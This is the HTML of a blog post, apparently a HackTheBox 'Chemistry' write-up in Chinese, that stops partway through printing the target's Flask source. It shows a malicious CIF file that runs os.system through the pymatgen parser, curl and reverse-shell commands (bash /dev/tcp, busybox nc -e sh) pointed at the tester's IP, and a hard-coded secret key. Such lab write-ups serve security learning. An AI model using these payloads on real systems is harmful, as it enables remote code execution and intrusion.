@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ChemistryEnumeration1└─$ rustscan -a 10.10.11.38  -- -sC -sV -Pn 好像沒有沒什麼特別的路徑就兩個 port先到 &#x2F;register 註冊 test:test登入後就重導向到在 here 下載 example.cif 12345678910111213141516data_Example_cell_length_a    10.0000">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Chemistry">
+<meta property="og:url" content="http://example.com/2025/01/07/HTB-Chemistry/index.html">
+<meta property="og:site_name" content="wang&#39;s blog">
+<meta property="og:description" content="ChemistryEnumeration1└─$ rustscan -a 10.10.11.38  -- -sC -sV -Pn 好像沒有沒什麼特別的路徑就兩個 port先到 &#x2F;register 註冊 test:test登入後就重導向到在 here 下載 example.cif 12345678910111213141516data_Example_cell_length_a    10.0000">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SynhdNuIyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJjeNh_Lkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1L8E3_8kx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1P34ndL1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sybzc6dIJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1zU5au8kg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyykEn_Ukx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk0Ev2uIkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hy8EKpOU1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HylU3auIke.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryhsp6dLkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyX666uUyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1V2ApdU1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1Z7JRdU1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJdSrCdIJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkgPPxY8ye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk-jPetLJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJryKeK8Jl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sksf9eYU1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkWDHWt81l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1tvx-c8kx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1yFXZqLkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk8LV-581e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1TXrW5Uyg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByS_BZ5Ikl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJf5yM5L1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyZExG9Iyg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkpZBzcUyg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJZ5YMcIJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkqtcG5Uyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1QTpGqLyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1610zcUJx.png">
+<meta property="article:published_time" content="2025-01-07T14:32:40.000Z">
+<meta property="article:modified_time" content="2025-05-02T14:34:54.648Z">
+<meta property="article:author" content="wang">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SynhdNuIyx.png">
+    
+    
+    <!-- title -->
+    <title>HTB Chemistry</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/18/picoCTF-2025-WriteUp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/06/HTB-Cicada/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/07/HTB-Chemistry/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/07/HTB-Chemistry/&text=HTB Chemistry"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/07/HTB-Chemistry/&is_video=false&description=HTB Chemistry"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Chemistry&body=Check out this article: http://example.com/2025/01/07/HTB-Chemistry/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/07/HTB-Chemistry/&title=HTB Chemistry"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/07/HTB-Chemistry/&name=HTB Chemistry&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/07/HTB-Chemistry/&t=HTB Chemistry"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chemistry"><span class="toc-number">1.</span> <span class="toc-text">Chemistry</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">1.3.</span> <span class="toc-text">Lateral Movement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exloitation"><span class="toc-number">1.4.2.</span> <span class="toc-text">exloitation</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Chemistry
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-07T14:32:40.000Z" class="dt-published" itemprop="datePublished">2025-01-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Chemistry"><a href="#Chemistry" class="headerlink" title="Chemistry"></a>Chemistry</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ rustscan -a 10.10.11.38  -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SynhdNuIyx.png" alt="image"><br>好像沒有沒什麼特別的路徑<br><img src="https://hackmd.io/_uploads/SJjeNh_Lkl.png" alt="image"><br>就兩個 port<br>先到 <code>/register</code> 註冊 <code>test:test</code><br><img src="https://hackmd.io/_uploads/S1L8E3_8kx.png" alt="image"><br>登入後就重導向到<br><img src="https://hackmd.io/_uploads/H1P34ndL1x.png" alt="image"><br>在 <code>here</code> 下載 <code>example.cif</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data_Example</span><br><span class="line">_cell_length_a    <span class="number">10.00000</span></span><br><span class="line">_cell_length_b    <span class="number">10.00000</span></span><br><span class="line">_cell_length_c    <span class="number">10.00000</span></span><br><span class="line">_cell_angle_alpha <span class="number">90.00000</span></span><br><span class="line">_cell_angle_beta  <span class="number">90.00000</span></span><br><span class="line">_cell_angle_gamma <span class="number">90.00000</span></span><br><span class="line">_symmetry_space_group_name_H-M <span class="string">&#x27;P 1&#x27;</span></span><br><span class="line">loop_</span><br><span class="line"> _atom_site_label</span><br><span class="line"> _atom_site_fract_x</span><br><span class="line"> _atom_site_fract_y</span><br><span class="line"> _atom_site_fract_z</span><br><span class="line"> _atom_site_occupancy</span><br><span class="line"> H <span class="number">0.00000</span> <span class="number">0.00000</span> <span class="number">0.00000</span> <span class="number">1</span></span><br><span class="line"> O <span class="number">0.50000</span> <span class="number">0.50000</span> <span class="number">0.50000</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>上傳後<br><img src="https://hackmd.io/_uploads/Sybzc6dIJl.png" alt="image"><br>點View<br><img src="https://hackmd.io/_uploads/B1zU5au8kg.png" alt="image"><br>嘗試SSTI 在檔案末尾加 49  之類，但不是回應500就是View後沒有變化</p>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>google <code>CIF upload exploit</code><br><img src="https://hackmd.io/_uploads/SyykEn_Ukx.png" alt="image"><br><img src="https://hackmd.io/_uploads/rk0Ev2uIkg.png" alt="image"><br><img src="https://hackmd.io/_uploads/Hy8EKpOU1e.png" alt="螢幕擷取畫面 2025-01-06 110745"><br>直接複製這裡的PoC<br>但發現不管system參數是甚麼，上傳後都回應500<br>用常見 reverseshell (ex. <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.252/9001 0&gt;&amp;1&#39;</code>)也收不到回應<br><del>後來知道是因為單引號沒escape</del></p>
+<p>改用 curl 測試是否有被執行並可以連到 local<br>kali <code>sudo python3 -m http.server 8000</code><br>vuln.cif</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;curl http://10.10.14.20:8000&quot;);0,0,0&#x27;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HylU3auIke.png" alt="image"><br>可以執行並連到，那理論上 reverse shell 也是可以的<br>接下來在 burpsuite repeater 開始把 <code>curl http://10.10.14.20:8000</code> 逐一替換成 <a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a> 的指令，並去 View 使 server 觸發執行<br>直到替換成 <code>busybox nc 10.10.14.20 9001 -e sh</code><br><img src="https://hackmd.io/_uploads/ryhsp6dLkg.png" alt="image"><br>View 後<br><img src="https://hackmd.io/_uploads/SyX666uUyl.png" alt="image"><br><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 升級 shell</p>
+<h3 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h3><p><img src="https://hackmd.io/_uploads/r1V2ApdU1l.png" alt="image"><br>要想辦法移動到 rosa<br><img src="https://hackmd.io/_uploads/S1Z7JRdU1g.png" alt="image"><br><code>app.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, login_required, logout_user, current_user</span><br><span class="line"><span class="keyword">from</span> pymatgen.io.cif <span class="keyword">import</span> CifParser</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;MyS3cretCh3mistry4PP&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;sqlite:///database.db&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;ALLOWED_EXTENSIONS&#x27;</span>] = &#123;<span class="string">&#x27;cif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">login_manager = LoginManager(app)</span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(UserMixin, db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Structure</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    filename = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    identifier = db.Column(db.String(<span class="number">100</span>), nullable=<span class="literal">False</span>, unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">return</span> User.query.get(<span class="built_in">int</span>(user_id))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> app.config[<span class="string">&#x27;ALLOWED_EXTENSIONS&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_density</span>(<span class="params">structure</span>):</span><br><span class="line">    atomic_mass_Si = <span class="number">28.0855</span></span><br><span class="line">    num_atoms = <span class="number">2</span></span><br><span class="line">    mass_unit_cell = num_atoms * atomic_mass_Si</span><br><span class="line">    mass_in_grams = mass_unit_cell * <span class="number">1.66053906660e-24</span></span><br><span class="line">    volume_in_cm3 = structure.lattice.volume * <span class="number">1e-24</span></span><br><span class="line">    density = mass_in_grams / volume_in_cm3</span><br><span class="line">    <span class="keyword">return</span> density</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username=username).first():</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        hashed_password = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        new_user = User(username=username, password=hashed_password)</span><br><span class="line">        db.session.add(new_user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        login_user(new_user)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = User.query.filter_by(username=username).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            login_user(user)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;Invalid credentials&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    structures = Structure.query.filter_by(user_id=current_user.<span class="built_in">id</span>).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, structures=structures)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        identifier = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], identifier + <span class="string">&#x27;_&#x27;</span> + filename)</span><br><span class="line">        file.save(filepath)</span><br><span class="line">        new_structure = Structure(user_id=current_user.<span class="built_in">id</span>, filename=filename, identifier=identifier)</span><br><span class="line">        db.session.add(new_structure)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/structure/&lt;identifier&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_structure</span>(<span class="params">identifier</span>):</span><br><span class="line">    structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.<span class="built_in">id</span>).first_or_404()</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], structure_entry.identifier + <span class="string">&#x27;_&#x27;</span> + structure_entry.filename)</span><br><span class="line">    parser = CifParser(filepath)</span><br><span class="line">    structures = parser.parse_structures()</span><br><span class="line">    </span><br><span class="line">    structure_data = []</span><br><span class="line">    <span class="keyword">for</span> structure <span class="keyword">in</span> structures:</span><br><span class="line">        sites = [&#123;</span><br><span class="line">            <span class="string">&#x27;label&#x27;</span>: site.species_string,</span><br><span class="line">            <span class="string">&#x27;x&#x27;</span>: 